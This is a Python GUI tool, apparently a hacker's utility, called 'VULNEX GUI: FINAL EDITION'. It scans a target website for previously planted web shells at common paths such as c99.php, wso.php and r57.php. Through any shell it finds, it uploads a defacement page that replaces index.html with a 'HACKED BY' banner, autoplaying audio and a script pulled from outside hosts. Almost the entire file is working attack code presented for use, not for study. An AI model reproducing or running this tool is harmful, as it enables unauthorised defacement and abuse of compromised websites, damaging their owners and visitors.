import requests, threading, os
from tkinter import *
from tkinter import filedialog, messagebox
from tkinter.ttk import Combobox
from urllib.parse import urljoin

# GUI Setup
root = Tk()
root.title("🔥 VULNEX GUI: FINAL EDITION")
root.geometry("700x600")
root.configure(bg="#1e1e1e")

logo = PhotoImage(file="logo.png")  # Pastikan logo tersedia dengan nama ini
Label(root, image=logo, bg="#1e1e1e").pack()
Label(root, text="VULNEX GUI: FINAL EDITION", font=("Helvetica", 18, "bold"), fg="cyan", bg="#1e1e1e").pack()

url_entry = Entry(root, width=80)
url_entry.pack(pady=10)

results_box = Text(root, height=20, width=90, bg="black", fg="lime")
results_box.pack()

# Shell path patterns
shell_paths = [
    "shell.php", "up.php", "cmd.php", "sh.php", "upload.php", "backdoor.php",
    "adminer.php", "pwn.php", "bypass.php", "c99.php", "wso.php", "r57.php"
]

# Auto Deface Content
deface_html = '''<html><head><title>HACKED BY R4JXPL0IT</title></head>
<body bgcolor=black><center><img src='https://k.top4top.io/p_3383hpowi1.png' width=300><br>
<font color=white size=5>R4JCPLOIT TERLALU GANTENG BUAT PACARNYA</font>
<br><audio autoplay loop><source src='https://k.top4top.io/m_3384dki6b1.mp3' type='audio/mpeg'></audio>
</center><script src='https://cdn.prinsh.com/NathanPrinsley-effect/salju-terbang.js'></script></body></html>'''

def check_shell_upload(base_url):
    results_box.insert(END, f"[+] Checking shell upload path on {base_url}\n")
    for path in shell_paths:
        full_url = urljoin(base_url, path)
        try:
            r = requests.get(full_url, timeout=5)
            if "shell" in r.text or "WSO" in r.text or "cmd" in r.text:
                results_box.insert(END, f"[!] Shell Detected: {full_url}\n")
                with open("found_shells.txt", "a") as f:
                    f.write(full_url + "\n")
                return full_url
        except:
            continue
    results_box.insert(END, "[-] No shell found.\n")
    return None

def auto_deface(base_url):
    shell_url = check_shell_upload(base_url)
    if shell_url:
        try:
            upload = requests.post(shell_url, files={'file': ('index.html', deface_html)}, timeout=10)
            results_box.insert(END, f"[+] Auto Deface Attempted: {shell_url}\n")
        except:
            results_box.insert(END, f"[!] Failed deface at {shell_url}\n")
    else:
        results_box.insert(END, "[-] Cannot deface, no shell found.\n")

# Trigger
Button(root, text="Scan Shell + Auto Deface", bg="red", fg="white", command=lambda: threading.Thread(target=auto_deface, args=(url_entry.get(),)).start()).pack(pady=10)

root.mainloop()
